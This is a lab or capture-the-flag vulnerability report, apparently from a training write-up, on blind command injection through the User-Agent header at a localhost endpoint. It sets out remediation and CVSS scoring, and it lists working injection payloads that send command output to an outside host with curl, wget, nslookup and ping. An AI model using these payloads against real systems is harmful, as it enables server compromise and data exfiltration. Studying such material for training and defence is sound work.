# Blind Command Injection

## Vulnerability Report : Blind Command Injection

**Challenge Name:** Blind Command Injection

### 1. Vulnerability Name & Description

**Blind OS Command Injection via User-Agent Header**

The Blind Command Injection vulnerability exists in the application's logging mechanism that processes the User-Agent HTTP header without proper sanitization. Unlike traditional command injection where output is directly visible, blind command injection provides no direct feedback to the attacker. The application executes injected commands on the backend server, but the results are not displayed in the HTTP response. Attackers must use out-of-band techniques (such as time delays, DNS lookups, or HTTP callbacks) to confirm command execution and exfiltrate data.

### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:** [http://localhost:1337/lab/command-injection/blind-command-injection/](http://localhost:1337/lab/command-injection/blind-command-injection/)

**Vulnerable Parameter:** User-Agent HTTP Header

**Initial Discovery:**

* Login page displays message: "Admin logs your user-agent on their system"
* This indicates backend logging of User-Agent header
* Backend likely executes: `echo $USER_AGENT >> logs.txt` or similar command

**Payload Used for Out-of-Band Exfiltration:**

`User-Agent: royal_http/10.227.1.234:1234?command=`id\`\`

**Attack Steps:**

1. Access the Blind Command Injection page at [http://localhost:1337/lab/command-injection/blind-command-injection/](http://localhost:1337/lab/command-injection/blind-command-injection/)
2. Set up HTTP listener on attacker machine: `python3 -m http.server 1234`
3. Intercept login request using Burp Suite
4. Modify User-Agent header to inject command with HTTP callback
5. Inject payload: `royal_http/10.227.1.234:1234?command=uid=33(www-data)`
6. Submit the login request
7. No visible output on the web page (blind injection)
8. Attacker's HTTP server receives incoming request with command output
9. HTTP server log shows: `GET /?command=uid=33(www-data) HTTP/1.1" 200`
10. Confirms command execution and reveals www-data user context

**Alternative Blind Injection Techniques:**

```bash
*# Time-based detection*
User-Agent: test$(sleep 10)

*# DNS exfiltration*
User-Agent: test$(nslookup `whoami`.attacker.com)

*# HTTP callback with command output*
User-Agent: test`curl <http://10.227.1.234:1234/?data=$(id|base64)`>

*# File writing for confirmation*
User-Agent: test$(echo "hacked" > /tmp/pwned.txt)

*# Ping back to attacker*
User-Agent: test$(ping -c 3 10.227.1.234)

*# Wget callback*
User-Agent: test$(wget <http://10.227.1.234:1234/$(whoami)>)
```

### 3. Impact Analysis

* **Stealthy Server Compromise:** Attackers execute commands without leaving visible traces in application responses
* **Data Exfiltration:** Sensitive data can be extracted through out-of-band channels (HTTP, DNS, ICMP)
* **Difficult Detection:** Traditional security monitoring may miss blind injection attacks as there's no obvious output
* **Complete System Control:** Full command execution capabilities despite lack of direct feedback
* **Privilege Escalation:** Can execute commands to escalate privileges or create backdoor accounts
* **Network Reconnaissance:** Use compromised server as pivot point for internal network scanning
* **Confidentiality: CRITICAL** - Can exfiltrate sensitive files, credentials, and database contents
* **Integrity: CRITICAL** - Ability to modify system files, install malware, and create persistent backdoors
* **Availability: CRITICAL** - Can crash services, delete critical files, or launch resource exhaustion attacks
* **Persistent Access:** Can establish reverse shells or install web shells for ongoing access
* **Compliance Impact:** Undetected breaches lead to prolonged data exposure and severe compliance violations

### 4. CVSS 3.1 Score & Vector String

**CVSS Base Score:** 9.8 (Critical)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

### 5. Risk Rating / Severity

**SEVERITY: CRITICAL**

**Risk Level:** IMMEDIATE ACTION REQUIRED

Blind command injection is particularly dangerous as it's harder to detect than regular command injection. The lack of direct output makes it more difficult for security teams to identify exploitation attempts, allowing attackers extended access to compromise systems.

### 6. Remediation / Mitigation Steps

1. **Sanitize All HTTP Headers:**
   * Never trust or directly use HTTP headers (User-Agent, Referer, X-Forwarded-For, etc.) in system commands
   * Implement strict input validation on all header values
   * Use allowlist validation for expected header formats
2. **Avoid Shell Command Execution:**
   * Never pass HTTP headers to shell commands or logging scripts
   * Use native logging functions instead of shell-based logging
   * Replace shell scripts with application-level logging
3. **Implement Secure Logging:**
   * Log User-Agent data directly to files or databases without shell interpretation
   * Use parameterized logging libraries
   * Escape special characters before any processing
4. **Input Validation and Encoding:**
   * Strip or encode shell metacharacters: `;`, `|`, `&`, `$`, \`\`\`, `(`, `)`, `<`, `>`, `\\n`
   * Validate User-Agent format against expected patterns
   * Reject suspicious or malformed User-Agent strings
5. **Monitoring and Detection:**
   * Monitor for unusual User-Agent patterns or command-like syntax
   * Implement anomaly detection for abnormal logging behavior
   * Alert on unexpected outbound network connections from web servers
   * Monitor DNS queries and HTTP requests to external hosts
6. **Network Segmentation:**
   * Restrict outbound connections from web servers
   * Block unnecessary protocols (DNS, ICMP) at firewall level
   * Implement egress filtering to prevent data exfiltration

### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

* Screenshot 1: Login page displays "mandalorian / mandalorian" credentials and message "Admin logs your user-agent on their system", revealing User-Agent header is processed server-side.

<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

* Screenshot 2: After login, page shows "Admin logs your user-agent on their system" with no direct command output, confirming blind injection nature.

<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

* Screenshot 3: Attacker terminal shows python3 -m http.server 1234 listening on port 1234 to receive out-of-band callbacks.

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

* Screenshot 4: Burp Suite intercepts POST request with modified User-Agent header royal\_http/10.227.1.234:1234?command=id\`\` being sent to vulnerable endpoint.

<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

* Screenshot 5: Attacker's HTTP server log shows successful callback GET /?command=uid=33(www-data) HTTP/1.1" 200, confirming blind command injection execution with www-data privileges.
